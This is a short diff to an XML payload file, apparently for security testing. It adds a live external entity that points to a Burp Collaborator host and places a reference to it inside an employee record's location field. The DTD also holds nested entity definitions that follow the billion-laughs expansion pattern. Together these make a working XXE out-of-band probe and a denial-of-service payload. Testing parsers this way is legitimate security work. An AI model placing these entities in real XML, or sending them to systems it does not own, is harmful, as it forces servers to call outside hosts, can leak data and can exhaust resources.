@@ -5,7 +5,7 @@
   <!ENTITY t1 "&bar;&bar;">
   <!ENTITY t2 "&t1;&t1;&t1;&t1;">
   <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
-	<!-- <!ENTITY url SYSTEM "ipconfig"> -->
+<!ENTITY url SYSTEM "http://uom3iw8thayrdzra4qw93zbyxp3fr4.burpcollaborator.net">
 ]>
 <employees>
     <employee id="111">
@@ -16,7 +16,7 @@
     <employee id="222">
         <firstName>Alex</firstName>
         <lastName>Gussin</lastName>
-        <location>Russia</location>
+        <location>Russia - &url;</location>
     </employee>
     <employee id="333">
         <firstName>David</firstName>
